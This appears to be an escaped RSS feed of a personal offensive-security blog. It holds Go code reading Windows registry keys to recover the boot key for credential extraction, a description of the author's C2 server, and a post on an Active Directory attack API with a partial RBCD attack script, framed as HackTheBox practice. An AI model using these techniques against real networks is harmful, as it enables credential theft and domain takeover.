&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;names&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;JD&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Skew1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GBG&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Data&amp;#34;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;names&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;subKey&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;registry&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;OpenKey&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;registry&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;READ&lt;/span&gt;|&lt;span style=&#34;color:#a6e22e&#34;&gt;registry&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;QUERY_VALUE&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error opening subkey %s: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;subKey&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Pre-allocate a large enough buffer for the class&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;maxClassSize&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// Larger buffer size&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;classBytes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make([]&lt;span style=&#34;color:#66d9ef&#34;&gt;uint16&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;maxClassSize&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;classLen&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; uint32(&lt;span style=&#34;color:#a6e22e&#34;&gt;maxClassSize&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Get the class string with all other parameters&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;subKeyCount&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;maxSubKeyLen&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;maxClassLen&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;valueCount&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;maxValueNameLen&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;maxValueLen&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;secDescLen&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lastWriteTime&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Filetime&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;RegQueryInfoKey&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;windows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Handle&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;subKey&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;classBytes&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;classLen&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;subKeyCount&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;maxSubKeyLen&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;maxClassLen&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;valueCount&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;maxValueNameLen&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;maxValueLen&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;secDescLen&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lastWriteTime&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the code you are looping through the registry keys to get the boot key then you would decode it from UTF16 and hex to then unscramble the boot key.&lt;/p&gt;
&lt;p&gt;to be continued&amp;hellip;&amp;hellip;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Mothership_c2</title>
      <link>//localhost:1313/posts/mothership_c2/</link>
      <pubDate>Mon, 11 Nov 2024 17:31:31 -0700</pubDate>
      
      <guid>//localhost:1313/posts/mothership_c2/</guid>
      <description>&lt;h2 id=&#34;description&#34;&gt;Description:&lt;/h2&gt;
&lt;p&gt;Mothership C2 is my command and control server for managing and interacting with shell connections.&lt;/p&gt;
&lt;h2 id=&#34;features&#34;&gt;Features:&lt;/h2&gt;
&lt;p&gt;Some features of Mothership include&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Encryption for sending commands and their outputs&lt;/li&gt;
&lt;li&gt;Shells being managed and interacted with HTTP&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;what-is-a-c2&#34;&gt;What is a C2?&lt;/h2&gt;
&lt;p&gt;A C2 server is a Command and Control server, it helps with controlling and commanding shell connections. C2 servers are used by APTs (advanced persistent threats) and by red teams&lt;/p&gt;</description>
      <content>&lt;h2 id=&#34;description&#34;&gt;Description:&lt;/h2&gt;
&lt;p&gt;Mothership C2 is my command and control server for managing and interacting with shell connections.&lt;/p&gt;
&lt;h2 id=&#34;features&#34;&gt;Features:&lt;/h2&gt;
&lt;p&gt;Some features of Mothership include&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Encryption for sending commands and their outputs&lt;/li&gt;
&lt;li&gt;Shells being managed and interacted with HTTP&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;what-is-a-c2&#34;&gt;What is a C2?&lt;/h2&gt;
&lt;p&gt;A C2 server is a Command and Control server, it helps with controlling and commanding shell connections. C2 servers are used by APTs (advanced persistent threats) and by red teams&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;//localhost:1313/C2.svg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;That&amp;rsquo;s how they work simplified. There&amp;rsquo;s much more that they can do like handle multiple connections at once or support encryption.&lt;/p&gt;
&lt;h2 id=&#34;how-does-mothership-work&#34;&gt;How Does Mothership Work?&lt;/h2&gt;
&lt;p&gt;Mothership supports encryption unlike some other C2s and uses a unique form of authentication to prevent invalid agents from connecting. A diagram of how the authentication works.
&lt;img src=&#34;//localhost:1313/C2Auth.svg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;First the client creates a new agent ID&lt;/li&gt;
&lt;li&gt;Agent is ran on the target with the API URL and the hashed agent ID&lt;/li&gt;
&lt;li&gt;Agent ID is checked in the database&lt;/li&gt;
&lt;li&gt;Key Exchange is performed to allow encryption&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;key-exchange&#34;&gt;Key Exchange&lt;/h3&gt;
&lt;p&gt;For the key exchange to work the agent generates its own set of keys and sends its public key for the API to encrypt commands and receives the server&amp;rsquo;s public key, so it can send encrypted outputs for commands. Keys generated by agents are stored in memory as an extra layer of security. Once an agent disconnects it&amp;rsquo;s keys no longer are valid and same with its ID because it would already exist in the database.&lt;/p&gt;
&lt;h2 id=&#34;why-is-golang-mentioned-in-the-tags&#34;&gt;Why Is Golang Mentioned In The Tags?&lt;/h2&gt;
&lt;p&gt;Golang is mentioned because it is what the client code is written in. Originally it was in python but Python&amp;rsquo;s &amp;ldquo;cmd&amp;rdquo; module is too slow, and so I switched it over to Go for performance. It also doesn&amp;rsquo;t make my laptop sound like it&amp;rsquo;s ready to go into space.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Delta2</title>
      <link>//localhost:1313/posts/delta2/</link>
      <pubDate>Sun, 10 Nov 2024 16:56:20 -0700</pubDate>
      
      <guid>//localhost:1313/posts/delta2/</guid>
      <description>&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;Delta2 is an API that is a Swiss army knife for active directory. I wrote this project because I was sick of having to set up java and remembering how to use bloodhound python for doing active directory boxes on HackTheBox, so I wrote my own. Delta2&amp;rsquo;s primary use is automation like automate kerberoasting after mapping the domain or getting shortest paths to admin users and exploiting the necessary users to get to admin users.&lt;/p&gt;</description>
      <content>&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;Delta2 is an API that is a Swiss army knife for active directory. I wrote this project because I was sick of having to set up java and remembering how to use bloodhound python for doing active directory boxes on HackTheBox, so I wrote my own. Delta2&amp;rsquo;s primary use is automation like automate kerberoasting after mapping the domain or getting shortest paths to admin users and exploiting the necessary users to get to admin users.&lt;/p&gt;
&lt;p&gt;Delta2 was my first successful full-stack application and took many months to build. It uses Memgraph which is an alternative to Neo4j as the graphing database and FastAPI for the API, and it&amp;rsquo;s containerized with docker for easy deployment.&lt;/p&gt;
&lt;h2 id=&#34;process-of-building&#34;&gt;Process of building&lt;/h2&gt;
&lt;h3 id=&#34;plan&#34;&gt;Plan&lt;/h3&gt;
&lt;p&gt;My plan was to build some kind of script or API that will allow me to move through a domain efficiently. There were a few ways I could&amp;rsquo;ve done that like using bloodhound and neo4j to find paths in the graph, but that&amp;rsquo;d require me to read documentation and code that I didn&amp;rsquo;t write. My second option was to &amp;ldquo;reinvent the wheel&amp;rdquo; which is what I did. Unfortunately I thought it&amp;rsquo;d be the easiest way which it probably wasn&amp;rsquo;t, but I learned more than if I were to just make it based off of bloodhound.&lt;/p&gt;
&lt;h3 id=&#34;the-beginning&#34;&gt;The Beginning&lt;/h3&gt;
&lt;p&gt;After I kind of had a plan I started building it. I built an outline for the API with various routes I wanted like Kerberoasting, getting TGTs, AS-REP roasting, and a collection script. Testing was a bit of a pain because I would use boxes from HackTheBox, and sometimes I forgot to take out test code and I would have to take the repository down, remove the test code then put it back up to avoid spoilers for boxes.&lt;/p&gt;
&lt;h3 id=&#34;collection-script-works&#34;&gt;Collection Script Works&lt;/h3&gt;
&lt;p&gt;One big issue with building the collection script was supporting Kerberos and reading nTSecurityDescriptors. nTSecurityDescriptors describe what objects and permissions a user has over another for example: Bob has WriteAll on Administrator. I first realized the issue with Kerberos when I couldn&amp;rsquo;t get ldap3 and Impacket to work together like how they work in bloodhound python so I switched to BloodyAD which is an Active Directory privilege escalation framework. So I reverse engineered BloodyAD to figure out how to use it because there&amp;rsquo;s no documentation for how to use its python modules and got it kind of working. I say kind of because now I had to learn how to read nTSecurityDescriptors. You can find how I learned the syntax for nTSecurityDescriptors here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/&#34;&gt;https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Writing the collection script is what took the longest time because I also had to do a little reverse engineering on how bloodhound python worked and do a bunch of debugging to figure out what information and how to commit it to the graph as well as how to connect nodes. After collecting nodes next was to graph and link them that&amp;rsquo;s where I read and parsed nTSecurityDescriptors. No python modules supported it, so I had to do it manually.&lt;/p&gt;
&lt;h3 id=&#34;examples&#34;&gt;Examples&lt;/h3&gt;
&lt;p&gt;After getting the collection script working next was to write some examples for how to use the graph data and the other endpoints of the API.&lt;/p&gt;
&lt;p&gt;Some examples I built included a kerberoasting script and a RBCD (Resource Based Constrained Delegation) attack script. Some code snippets for the RBCD script:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(user, password, hash_, aeskey, delegate_to):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  comp_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;randomcomputer550&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  comp_pass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;target&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;domain&amp;#34;&lt;/span&gt;: domain,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc&amp;#34;&lt;/span&gt;: dc,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kerberos&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;False&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ldap_ssl&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;False&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_name&amp;#34;&lt;/span&gt;: user,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc_ip&amp;#34;&lt;/span&gt;: dc_ip
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kerb&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;: password,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_hash&amp;#34;&lt;/span&gt;: hash_,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aeskey&amp;#34;&lt;/span&gt;: aeskey
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ops&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;option&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;add_computer&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;computer_name&amp;#34;&lt;/span&gt;: comp_name,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;computer_pass&amp;#34;&lt;/span&gt;: comp_pass,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ou&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;contianer&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; req&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://localhost:9000/ldap/objeditor&amp;#39;&lt;/span&gt;, json&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;j)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;json()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  print(response)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;response&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;entryAlreadyExists&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;response&amp;#39;&lt;/span&gt;]:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; Custom_exception(message&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;response[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;response&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;target&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;domain&amp;#34;&lt;/span&gt;: domain,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc&amp;#34;&lt;/span&gt;: dc,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kerberos&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;False&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ldap_ssl&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;False&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user_name&amp;#34;&lt;/span&gt;: user,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc_ip&amp;#34;&lt;/span&gt;: dc_ip
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    },
